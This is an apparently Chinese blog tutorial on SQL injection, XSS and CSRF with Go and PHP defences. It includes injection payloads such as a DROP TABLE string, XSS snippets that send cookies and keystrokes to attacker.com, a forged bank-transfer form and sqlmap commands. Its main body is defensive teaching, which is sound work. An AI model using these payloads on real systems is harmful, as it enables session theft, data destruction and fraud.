---
title: "SQL 注入、XSS、CSRF 攻击原理与防护实战"
date: 2026-04-21 10:00:00
author: PFinal南丞
description: "深入讲解 SQL 注入、XSS、CSRF 三大 Web 安全漏洞的攻击原理、实战演示与防护方案，包含 Go 和 PHP 语言的具体防护代码实现。"
keywords:
  - SQL 注入
  - XSS 攻击
  - CSRF 防护
  - Web 安全
  - 渗透测试
tags:
  - security
  - web-security
  - tutorial
---

# SQL 注入、XSS、CSRF 攻击原理与防护实战

> 这三类漏洞常年霸占 OWASP Top 10 榜单，几乎所有 Web 应用都曾面临它们的威胁。理解攻击原理，才能写出真正安全的代码。

**Web 安全系列文章：**
- [Golang Web 应用完整安全指南](/security/engineering/golang Web应用完整安全指南) - Go 语言安全开发指南
- [10个Golang安全陷阱及真正有效的修复方案](/security/engineering/10个Golang安全陷阱及真正有效的修复方案) - 常见安全问题汇总
- [Go语言主流安全库使用指南](/security/engineering/Go语言主流安全库使用指南) - 安全库推荐
- [Gin框架实战指南](/dev/backend/golang/gin-framework-guide) - 安全Web框架
- [蜜罐部署实战](/security/engineering/honeypot-deployment) - 主动防御体系

## 一、SQL 注入（SQL Injection）

### 攻击原理

SQL 注入是将恶意 SQL 代码插入到应用程序的输入中，从而篡改原始 SQL 查询。

### 漏洞示例

```go
// ❌ 存在 SQL 注入的代码
func getUserByName(name string) (*User, error) {
    // 直接拼接用户输入！
    query := "SELECT * FROM users WHERE name = '" + name + "'"
    row := db.QueryRow(query)
    // ...
}

// 攻击者输入：
// name = "' OR '1'='1"
// 实际执行：SELECT * FROM users WHERE name = '' OR '1'='1'
// 结果：返回所有用户！

// 更危险的攻击：
// name = "'; DROP TABLE users; --"
// 实际执行：SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
// 结果：删除 users 表！
```

```php
// ❌ PHP 中的 SQL 注入
$name = $_GET['name'];
$sql = "SELECT * FROM users WHERE name = '$name'";
$result = mysqli_query($conn, $sql);  // 危险！
```

### 防护方案

```go
// ✅ Go：使用参数化查询（Prepared Statement）
func getUserByName(name string) (*User, error) {
    var user User
    err := db.QueryRow("SELECT * FROM users WHERE name = ?", name).Scan(
        &user.ID, &user.Name, &user.Email,
    )
    return &user, err
}

// ✅ GORM（自动使用参数化查询）
db.Where("name = ?", name).First(&user)

// ✅ 使用 sqlx
db.Get(&user, "SELECT * FROM users WHERE name = ?", name)
```

```php
// ✅ PHP PDO 参数化查询
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = :name");
$stmt->bindParam(':name', $name, PDO::PARAM_STR);
$stmt->execute();

// ✅ mysqli 参数化查询
$stmt = $conn->prepare("SELECT * FROM users WHERE name = ?");
$stmt->bind_param("s", $name);
$stmt->execute();
```

### SQL 注入检测工具

```bash
# sqlmap 自动化检测
sqlmap -u "http://example.com/user?id=1" --dbs

# 手动测试 payload
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL, NULL, NULL--
'; WAITFOR DELAY '0:0:5'--    # 时间盲注测试（MSSQL）
' AND SLEEP(5)--               # 时间盲注测试（MySQL）
```

---

## 二、XSS（跨站脚本攻击）

### 攻击类型

```
XSS 三种类型：

1. 存储型 XSS（持久型）：恶意脚本存入数据库，每次访问都执行
   用户评论 → 存入 DB → 其他用户查看时执行恶意脚本

2. 反射型 XSS（非持久型）：恶意脚本在 URL 中
   攻击者发送含 XSS 的链接 → 用户点击 → 脚本在用户浏览器执行

3. DOM 型 XSS：通过 JavaScript 操作 DOM 触发
   前端 JS 读取 URL 参数直接写入 DOM
```

### 攻击示例

```html
<!-- 存储型 XSS：用户在评论框输入 -->
<script>
  // 窃取 Cookie
  document.location='http://attacker.com/steal?c='+document.cookie;
</script>

<!-- 更隐蔽的写法 -->
<img src="x" onerror="this.src='http://attacker.com/steal?c='+document.cookie">

<!-- 键盘记录器 -->
<script>
  document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify({key: e.key})
    });
  });
</script>
```

### 防护方案

```go
// ✅ Go：HTML 转义
import "html"

func renderComment(content string) string {
    return html.EscapeString(content)
}
// "Hello <script>alert(1)</script>" 
// → "Hello &lt;script&gt;alert(1)&lt;/script&gt;"

// ✅ Go HTML 模板（自动转义）
import "html/template"

tmpl := template.Must(template.New("").Parse(`
    <p>评论：{{.Content}}</p>  <!-- 自动转义 -->
`))

// ✅ 如果需要允许部分 HTML，使用白名单过滤
import "github.com/microcosm-cc/bluemonday"

policy := bluemonday.UGCPolicy() // 用户生成内容策略
safe := policy.Sanitize(userInput)
```

```php
// ✅ PHP：htmlspecialchars 转义
$safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "<p>{$safe}</p>";

// ✅ HTML Purifier（允许 HTML 时使用）
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean = $purifier->purify($userInput);
```

### CSP（Content Security Policy）防护

```go
// Gin 中间件设置 CSP
func CSPMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("Content-Security-Policy",
            "default-src 'self'; "+
            "script-src 'self' 'nonce-{随机值}'; "+
            "style-src 'self' https://fonts.googleapis.com; "+
            "img-src 'self' data: https:; "+
            "frame-ancestors 'none'")
        c.Next()
    }
}
```

```html
<!-- HTML 中使用 nonce 允许内联脚本 -->
<script nonce="随机值">
    // 这个脚本被允许执行
</script>

<!-- 无 nonce 的内联脚本被 CSP 阻止 -->
<script>alert('XSS')</script>  <!-- 被阻止！ -->
```

---

## 三、CSRF（跨站请求伪造）

### 攻击原理

```
CSRF 攻击流程：

1. 用户登录银行网站 bank.com（浏览器保存了 Cookie）
2. 用户访问恶意网站 attacker.com
3. 恶意网站包含以下代码：

<img src="http://bank.com/transfer?to=attacker&amount=10000">
<form action="http://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>

4. 浏览器自动带上 bank.com 的 Cookie 发送请求
5. 银行服务器认为是合法请求，完成转账！
```

### 防护方案 1：CSRF Token

```go
// Go：生成和验证 CSRF Token
import "github.com/gorilla/csrf"

func main() {
    r := gin.Default()

    // 生成随机密钥（32字节）
    csrfMiddleware := csrf.Protect(
        []byte("32-byte-long-auth-key"),
        csrf.Secure(true),              // 仅 HTTPS
        csrf.HttpOnly(false),           // JavaScript 可访问 Token
        csrf.SameSite(csrf.SameSiteStrictMode),
    )

    // 在表单中注入 Token
    r.GET("/form", func(c *gin.Context) {
        token := csrf.Token(c.Request)
        c.JSON(200, gin.H{"csrf_token": token})
    })

    // 验证 Token
    r.POST("/transfer", csrfMiddleware(http.HandlerFunc(handleTransfer)))
}
```

```php
// PHP：CSRF Token
session_start();

// 生成 Token
function generateCSRFToken(): string {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// 表单中输出 Token
echo '<input type="hidden" name="csrf_token" value="' . generateCSRFToken() . '">';

// 验证 Token
function verifyCSRFToken(string $token): bool {
    return isset($_SESSION['csrf_token']) 
        && hash_equals($_SESSION['csrf_token'], $token);
}

if (!verifyCSRFToken($_POST['csrf_token'])) {
    http_response_code(403);
    die('CSRF Token 验证失败');
}
```

### 防护方案 2：SameSite Cookie

```go
// 设置 SameSite Cookie（最简单的防护）
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    HttpOnly: true,
    Secure:   true,             // 仅 HTTPS
    SameSite: http.SameSiteStrictMode,  // 严格模式：跨站请求不带 Cookie
    // SameSite: http.SameSiteLaxMode, // 宽松模式：只阻止 POST 等非安全方法
})
```

### 防护方案 3：检查 Origin/Referer

```go
func CSRFOriginCheck() gin.HandlerFunc {
    return func(c *gin.Context) {
        if c.Request.Method == "POST" || c.Request.Method == "PUT" ||
            c.Request.Method == "DELETE" {
            origin := c.GetHeader("Origin")
            referer := c.GetHeader("Referer")

            // 检查来源是否合法
            allowedOrigins := []string{
                "https://friday-go.icu",
                "https://www.friday-go.icu",
            }

            valid := false
            for _, allowed := range allowedOrigins {
                if origin == allowed || strings.HasPrefix(referer, allowed) {
                    valid = true
                    break
                }
            }

            if !valid && origin != "" {  // 允许没有 Origin 头的请求（非浏览器）
                c.AbortWithStatusJSON(403, gin.H{"error": "非法的请求来源"})
                return
            }
        }
        c.Next()
    }
}
```

---

## 四、安全响应头汇总

```go
// 完整的安全头中间件
func SecurityHeaders() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 防止 XSS
        c.Header("X-XSS-Protection", "1; mode=block")

        // 防止 MIME 类型嗅探
        c.Header("X-Content-Type-Options", "nosniff")

        // 防止点击劫持
        c.Header("X-Frame-Options", "DENY")

        // 强制 HTTPS
        c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")

        // CSP
        c.Header("Content-Security-Policy",
            "default-src 'self'; script-src 'self'; object-src 'none'")

        // 减少信息泄露
        c.Header("Server", "")
        c.Header("X-Powered-By", "")

        // 引用者策略
        c.Header("Referrer-Policy", "strict-origin-when-cross-origin")

        c.Next()
    }
}
```

---

## 五、实用安全检测清单

```bash
# 使用 OWASP ZAP 进行自动扫描
docker run -t owasp/zap2docker-stable zap-baseline.py \
    -t https://friday-go.icu

# 检查响应头
curl -I https://friday-go.icu | grep -E "(X-|Content-Security|Strict)"

# SQL 注入快速检测
sqlmap -u "https://example.com/api/user?id=1" --level=5 --risk=3

# nikto Web 服务器扫描
nikto -h https://example.com
```

---

## 总结对比

| 漏洞 | 危害 | 核心防护 | 难度 |
|------|------|---------|------|
| SQL 注入 | 数据库泄露/篡改 | 参数化查询 | ⭐⭐ |
| XSS | 窃取凭证/劫持会话 | HTML 转义 + CSP | ⭐⭐⭐ |
| CSRF | 伪造用户操作 | Token + SameSite Cookie | ⭐⭐ |

**黄金原则**：
- 永远不要信任用户输入
- 输入验证 + 输出转义 + 最小权限原则
- 定期用自动化工具扫描

---

*作者：PFinal南丞 | 更新时间：2026-04-21*
